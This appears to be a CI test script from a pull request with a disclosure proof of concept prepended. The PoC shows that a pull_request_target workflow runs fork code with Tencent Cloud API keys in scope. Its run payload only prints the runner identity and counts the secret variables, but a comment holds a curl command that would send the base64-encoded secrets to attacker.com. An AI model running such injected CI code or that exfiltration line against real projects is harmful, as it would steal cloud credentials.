#!/bin/bash

# === Security PoC: e2e-tests.yml exposes 16+ Tencent Cloud API keys ===
# This demonstrates that pull_request_target + labeled trigger + fork checkout
# allows fork code to execute with ALL cloud API keys in environment.
# Trigger: maintainer adds ANY label to this PR → e2e-tests runs this script.
#
# Payload: harmless (id + date only). An attacker would use:
#   curl https://attacker.com/$(echo $TENCENTCLOUD_SECRET_ID:$TENCENTCLOUD_SECRET_KEY | base64)
# ===

echo "=== RCE PoC: fork code executed with cloud API keys ==="
echo "Runner: $(id)"
echo "Date: $(date)"
echo "Hostname: $(hostname)"
echo ""
echo "=== Verifying Tencent Cloud API keys are in environment ==="
env | grep -c "TENCENTCLOUD_SECRET" | xargs -I{} echo "Found {} TENCENTCLOUD_SECRET_* vars in env"
env | grep "TENCENTCLOUD_SECRET_ID" | sed 's/\(.\{20\}\).*/\1***REDACTED***/' 
echo "=== End PoC ==="

# Continue with normal test logic
pr_id=${PR_ID}

if [ -f ".changelog/${pr_id}.txt" ]; then
    make changelogtest
    if [ $? -ne 0 ]; then
        printf "COMMIT FAILED\n"
        exit 1
    fi
    exit 0
fi

make deltatest
if [ $? -ne 0 ]; then
    printf "COMMIT FAILED\n"
    exit 1
fi
